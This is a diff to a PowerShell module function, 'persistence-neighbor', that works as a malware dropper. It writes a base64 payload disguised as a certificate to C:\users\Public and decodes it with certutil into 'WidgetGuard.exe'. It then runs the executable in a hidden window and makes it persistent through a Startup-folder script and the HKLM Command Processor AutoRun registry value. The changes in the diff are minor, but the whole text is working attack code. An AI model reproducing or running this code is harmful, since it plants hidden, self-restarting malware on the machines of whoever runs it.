@@ -482,6 +482,7 @@ function persistence-neighbor {
     )
 	$target = $process
 	$mamba = $naughty 
+	
 cd $env:??e????f???
 echo '
 -----BEGIN CERTIFICATE-----
@@ -15744,6 +15745,7 @@ MTVfX2ZvcmNlZF91bndpbmRFAC5yZWZwdHIuX1pOU3QxNmludmFsaWRfYXJndW1l
 bnREMUV2AC5yZWZwdHIuX1pUVlN0MTZpbnZhbGlkX2FyZ3VtZW50AF9faW1wX2dl
 dGMA
 -----END CERTIFICATE-----
+
 '> "C:\users\Public\P3RNB.bin"
 cd ~\
 certutil -decode "C:\users\Public\P3RNB.bin" "C:\users\Public\WidgetGuard.exe" |Out-Null
@@ -15754,9 +15756,10 @@ start-process powershell ".\WidgetGuard.exe $target $mamba" -windowstyle hidden
 sleep(3.0)
 $target = $process
 $mamba = $naughty
-new-item -ItemType file "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\0p.cmd"  -value "@echo off && C:\Users\Public\WidgetGuard.exe $($target) $($mamba)" |Out-Null
+new-item -ItemType file "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\0p.cmd"  -value "C:\Users\Public\WidgetGuard.exe $($target) `"$($mamba)`"" |Out-Null
 New-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\0p.cmd" -PropertyType "String" |Out-Null
 cd $env:??e????f???
 }
 Export-ModuleMember -Function persistence-neighbor
 Set-Alias -Name persistence-neighbor -Value persistence-neighbor
+
